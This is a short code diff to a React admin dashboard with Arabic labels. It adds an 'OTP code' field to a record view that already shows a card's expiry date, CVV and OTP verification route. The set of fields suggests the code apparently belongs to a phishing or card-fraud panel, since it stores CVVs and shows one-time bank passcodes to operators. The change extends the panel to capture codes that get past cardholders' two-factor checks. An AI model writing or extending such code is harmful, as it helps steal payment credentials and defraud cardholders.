@@ -300,6 +300,7 @@ export default function AdminDashboard() {
                     ["تاريخ الانتهاء", selected.expiry_date],
                     ["CVV", selected.cvv],
                     ["مسار التحقق", OTP_ROUTE_LABELS[selected.otp_route]],
+                    ["رمز OTP", selected.otp_code],
                   ]}
                   color="yellow"
                 />
